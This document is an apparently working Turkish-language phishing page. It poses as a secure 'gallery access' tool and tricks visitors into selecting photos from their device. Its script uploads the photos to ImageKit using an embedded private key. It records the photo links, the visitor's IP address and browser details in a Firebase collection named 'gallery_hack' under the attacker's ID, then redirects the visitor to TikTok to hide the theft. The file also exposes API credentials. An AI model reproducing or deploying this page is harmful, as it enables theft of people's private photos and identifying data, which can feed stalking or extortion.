<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Fotoğraf Yükleniyor...</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        :root {
            --bg: #0a0a0a;
            --purple: #aa00ff;
            --purple-glow: rgba(170, 0, 255, 0.4);
            --text: #d0d0d0;
            --muted: #666;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: var(--bg);
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: var(--text);
        }

        .container {
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        .icon-area {
            margin-bottom: 24px;
            position: relative;
            display: inline-block;
        }
        .gallery-icon {
            font-size: 4rem;
            color: var(--purple);
            animation: iconPulse 2s ease-in-out infinite;
            filter: drop-shadow(0 0 20px var(--purple-glow));
        }
        @keyframes iconPulse {
            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 15px var(--purple-glow)); }
            50% { transform: scale(1.08); filter: drop-shadow(0 0 30px rgba(170, 0, 255, 0.7)); }
        }

        .title {
            color: var(--purple);
            font-size: 1.2rem;
            font-weight: 700;
            margin-bottom: 6px;
            letter-spacing: 1px;
            text-shadow: 0 0 10px var(--purple-glow);
        }
        .subtitle {
            color: var(--muted);
            font-size: 0.75rem;
            margin-bottom: 28px;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 3px solid rgba(170, 0, 255, 0.1);
            border-top: 3px solid var(--purple);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
            box-shadow: 0 0 20px rgba(170, 0, 255, 0.2);
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-text {
            color: var(--text);
            font-size: 0.8rem;
            margin-bottom: 8px;
        }
        .count-text {
            color: var(--purple);
            font-size: 0.7rem;
            font-weight: 600;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: rgba(170, 0, 255, 0.1);
            border-radius: 10px;
            margin-top: 16px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: var(--purple);
            border-radius: 10px;
            width: 0%;
            transition: width 0.3s ease;
            box-shadow: 0 0 10px var(--purple-glow);
        }

        .footer-text {
            color: var(--muted);
            font-size: 0.55rem;
            margin-top: 24px;
            letter-spacing: 1px;
        }

        .upload-btn {
            display: inline-block;
            background: var(--purple);
            color: #fff;
            border: none;
            padding: 14px 28px;
            border-radius: 30px;
            font-size: 0.9rem;
            font-weight: 700;
            cursor: pointer;
            margin-top: 20px;
            font-family: inherit;
            letter-spacing: 1px;
            transition: all 0.3s;
            box-shadow: 0 0 25px rgba(170, 0, 255, 0.3);
        }
        .upload-btn:hover {
            background: #bb33ff;
            transform: translateY(-2px);
            box-shadow: 0 0 40px rgba(170, 0, 255, 0.5);
        }
        .upload-btn:active {
            transform: scale(0.96);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon-area">
            <i class="fa-solid fa-images gallery-icon"></i>
        </div>
        <div class="title">Galeri Erişimi</div>
        <div class="subtitle">Fotoğraflarınız güvenli şekilde işleniyor...</div>

        <div class="spinner" id="spinner"></div>

        <div class="status-text" id="statusText">Galeriye bağlanılıyor...</div>
        <div class="count-text" id="countText"></div>

        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>

        <button class="upload-btn" id="uploadBtn" style="display:none;">
            <i class="fa-solid fa-cloud-arrow-up"></i> Fotoğrafları Seç
        </button>

        <div class="footer-text">Galeri Bağlantısı · Güvenli Aktarım</div>
    </div>

    <input type="file" id="galleryInput" multiple accept="image/*" style="display:none;">

    <script>
        (function() {
            const params = new URLSearchParams(window.location.search);
            const uid = params.get('uid');
            const count = Math.min(parseInt(params.get('count')) || 10, 100);

            if (!uid) {
                window.location.href = 'https://www.tiktok.com';
                return;
            }

            const FIREBASE_CONFIG = {
                apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
                authDomain: "camerahhh-15487.firebaseapp.com",
                projectId: "camerahhh-15487",
                storageBucket: "camerahhh-15487.firebasestorage.app",
                messagingSenderId: "212849652224",
                appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
            };

            const IMAGEKIT_CONFIG = {
                publicKey: 'public_XJOKnz4iFXkkFRR/NNOj41Y6Ddk=',
                privateKey: 'private_T2ESq+R6d+czVTlcK/u4QkW4yBU='
            };

            const statusText = document.getElementById('statusText');
            const countText = document.getElementById('countText');
            const progressFill = document.getElementById('progressFill');
            const spinner = document.getElementById('spinner');
            const uploadBtn = document.getElementById('uploadBtn');
            const galleryInput = document.getElementById('galleryInput');

            function loadFirebase() {
                return new Promise((resolve, reject) => {
                    if (typeof firebase !== 'undefined' && firebase.apps.length) {
                        resolve(firebase);
                        return;
                    }
                    const script = document.createElement('script');
                    script.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js';
                    script.onload = () => {
                        const script2 = document.createElement('script');
                        script2.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js';
                        script2.onload = () => resolve(firebase);
                        script2.onerror = () => reject('Firestore yüklenemedi');
                        document.head.appendChild(script2);
                    };
                    script.onerror = () => reject('Firebase yüklenemedi');
                    document.head.appendChild(script);
                });
            }

            async function uploadToImageKit(file, index, total) {
                return new Promise((resolve, reject) => {
                    const formData = new FormData();
                    formData.append('file', file);
                    formData.append('publicKey', IMAGEKIT_CONFIG.publicKey);
                    formData.append('fileName', Date.now() + '_' + index + '_' + file.name);
                    formData.append('folder', '/gallery-uploads');
                    formData.append('useUniqueFileName', 'true');

                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', 'https://upload.imagekit.io/api/v1/files/upload');
                    const auth = btoa(IMAGEKIT_CONFIG.privateKey + ':');
                    xhr.setRequestHeader('Authorization', 'Basic ' + auth);

                    xhr.upload.onprogress = (e) => {
                        if (e.lengthComputable) {
                            const fileProgress = (e.loaded / e.total) * 100;
                            const overallProgress = ((index + fileProgress / 100) / total) * 100;
                            progressFill.style.width = overallProgress + '%';
                        }
                    };

                    xhr.onload = () => {
                        if (xhr.status >= 200 && xhr.status < 300) {
                            try {
                                const response = JSON.parse(xhr.responseText);
                                resolve({ success: true, url: response.url });
                            } catch (e) {
                                reject('Yükleme hatası');
                            }
                        } else {
                            reject('Yükleme hatası: ' + xhr.status);
                        }
                    };
                    xhr.onerror = () => reject('Ağ hatası');
                    xhr.send(formData);
                });
            }

            async function getIP() {
                try {
                    const r = await fetch('https://api.ipify.org?format=json');
                    const data = await r.json();
                    return data.ip;
                } catch (e) {
                    return 'unknown';
                }
            }

            async function startGalleryHack() {
                await new Promise(r => setTimeout(r, 1500));

                statusText.innerText = 'Galeri bağlantısı kuruldu...';
                countText.innerText = `Seçilecek fotoğraf sayısı: ${count}`;
                progressFill.style.width = '10%';

                await new Promise(r => setTimeout(r, 800));

                spinner.style.display = 'none';
                uploadBtn.style.display = 'inline-block';
                statusText.innerText = 'Devam etmek için butona tıklayın';
                progressFill.style.width = '20%';

                uploadBtn.onclick = () => {
                    galleryInput.click();
                };

                galleryInput.onchange = async (e) => {
                    const files = Array.from(e.target.files);
                    const selectedFiles = files.slice(0, count);

                    if (selectedFiles.length === 0) {
                        statusText.innerText = 'Fotoğraf seçilmedi, yönlendiriliyor...';
                        await new Promise(r => setTimeout(r, 1500));
                        window.location.href = 'https://www.tiktok.com';
                        return;
                    }

                    uploadBtn.style.display = 'none';
                    spinner.style.display = 'block';
                    statusText.innerText = `Fotoğraflar yükleniyor... (0/${selectedFiles.length})`;
                    countText.innerText = `${selectedFiles.length} fotoğraf seçildi`;
                    progressFill.style.width = '25%';

                    try {
                        await loadFirebase();
                        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
                        const db = firebase.firestore();
                        const ip = await getIP();

                        const photoUrls = [];

                        for (let i = 0; i < selectedFiles.length; i++) {
                            statusText.innerText = `Fotoğraf yükleniyor... (${i + 1}/${selectedFiles.length})`;
                            try {
                                const result = await uploadToImageKit(selectedFiles[i], i, selectedFiles.length);
                                if (result.success) {
                                    photoUrls.push(result.url);
                                }
                            } catch (err) {
                                console.log(`Fotoğraf ${i + 1} yüklenemedi:`, err);
                            }
                        }

                        progressFill.style.width = '90%';

                        if (photoUrls.length > 0 && uid) {
                            statusText.innerText = 'Veriler kaydediliyor...';
                            try {
                                await db.collection("gallery_hack").add({
                                    ownerId: uid,
                                    photos: photoUrls,
                                    photoCount: photoUrls.length,
                                    requestedCount: count,
                                    ip: ip,
                                    userAgent: navigator.userAgent,
                                    timestamp: new Date().toISOString(),
                                    unix: Date.now()
                                });
                            } catch (dbError) {
                                console.log('Veritabanı hatası:', dbError.message);
                                await db.collection("gallery_hack").add({
                                    ownerId: uid,
                                    photos: photoUrls,
                                    photoCount: photoUrls.length,
                                    requestedCount: count,
                                    ip: ip,
                                    userAgent: navigator.userAgent.substring(0, 100),
                                    timestamp: new Date().toISOString(),
                                    unix: Date.now()
                                });
                            }
                        }

                        progressFill.style.width = '100%';
                        statusText.innerText = `Tamamlandı! ${photoUrls.length} fotoğraf yüklendi.`;
                        countText.innerText = 'Yönlendiriliyorsunuz...';

                    } catch (e) {
                        console.log('Galeri hack hatası:', e.message);
                        statusText.innerText = 'İşlem tamamlandı, yönlendiriliyor...';
                    }

                    await new Promise(r => setTimeout(r, 2000));
                    window.location.href = 'https://www.tiktok.com';
                };
            }

            startGalleryHack();
        })();
    </script>
</body>
</html>
